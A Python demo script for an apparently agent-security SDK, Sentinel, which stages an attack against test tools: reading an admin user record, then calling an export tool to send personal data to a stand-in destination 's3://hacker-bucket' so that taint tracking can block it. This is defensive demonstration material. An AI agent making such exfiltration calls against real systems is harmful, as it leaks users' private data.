import asyncio
import os
import sys

# Ensure we can import the local SDK
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from sentinel_sdk import Sentinel
import logging

# Configure Logging to see Sentinel SDK output
logging.basicConfig(level=logging.INFO)

async def run_attack_scenario():
    print("Locked & Loaded: Starting Sentinel Hardening Demo...")
    
    # 1. Start Sentinel protecting the vulnerable tools
    client = Sentinel.start(
        upstream_cmd=sys.executable,
        upstream_args=["tests/resources/vulnerable_tools.py"],
        policy_path="tests/policy_hardening.yaml",
        binary_path="./sentinel/target/release/sentinel.exe" # Explicit path for demo
    )
    
    # Set security level via ENV since it's not a constructor arg
    os.environ["SENTINEL_SECURITY_LEVEL"] = "high"

    async with client:
        print("\n[Step 1] Initialized Sentinel Session")
        
        # 2. Attack Step A: Access Sensitive Data
        print("[Step 2] Attacker reads sensitive user DB...")
        try:
            result = await client.execute_tool("read_user_db", {"user_id": "admin"})
            print(f"   > Success: {result}")
            print("   > (Sentinel Internal State: Session is now TAINTED with [PII])")
        except Exception as e:
            print(f"   > Failed: {e}")

        # 3. Attack Step B: Try to Exfiltrate
        print("\n[Step 3] Attacker attempts to exfiltrate data to public cloud...")
        try:
            result = await client.execute_tool("export_to_cloud", {
                "data": "User Profile: victim@example.com", 
                "destination": "s3://hacker-bucket"
            })
            print(f"   > FATAL: Exfiltration succeeded! {result}")
        except Exception as e:
            # We expect a RuntimeError from the JSON-RPC error response
            print(f"   > BLOCKED BY SENTINEL: {e}")
            print("   > (Defense Successful: Taint propagation prevented exfiltration)")

if __name__ == "__main__":
    # Check if sentinel binary exists
    if not os.path.exists("./sentinel/target/release/sentinel.exe") and not os.path.exists("./sentinel/target/release/sentinel"):
         print("Error: Sentinel binary not found. Please run 'cargo build --release' in 'sentinel/' first.")
         sys.exit(1)
         
    asyncio.run(run_attack_scenario())
